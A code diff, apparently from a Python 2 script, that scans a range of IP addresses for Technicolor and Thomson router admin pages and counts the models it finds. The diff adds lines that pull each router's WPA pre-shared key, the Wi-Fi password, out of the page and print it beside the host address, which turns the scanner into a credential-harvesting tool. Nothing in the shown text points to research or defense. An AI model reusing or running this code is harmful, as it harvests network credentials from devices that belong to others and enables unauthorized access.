@@ -33,7 +33,9 @@ for i in range(180,201):
                             parser1=r2.content
                             bs1=BeautifulSoup(parser1, "html.parser")
                             for td in bs1.find_all("td", align="middle"):
-                                print str(h)+"........Technicolor......."+td.text[16:]
+                                for pwd in bs1.find_all("input", {'name':"WpaPreSharedKey"}):
+                                    #print pwd["value"]
+                                    print str(h)+".....Technicolor......."+td.text[16:]+"....."+pwd["value"]
                         else: ##Thomson
                             tom=tom+1
                             
@@ -45,7 +47,8 @@ for i in range(180,201):
                             bs1=BeautifulSoup(parser, "html.parser")
                             
                             for t in bs1.find_all("td", align='middle'):
-                                print h+"........Thomson..........."+t.text[16:]
+                                for pws in bs1.find_all("input", {'name':"WpaPreSharedKey"}):
+                                    print h+".....Thomson..........."+t.text[16:]+"....."+pws["value"]
             
                 except requests.exceptions.ConnectTimeout:
                     pass
@@ -58,3 +61,6 @@ for i in range(180,201):
 print str(tech)+" technicolor"
 print str(tom)+" tomson"
 print str(tech+tom)+" En total"
+
+                            
+
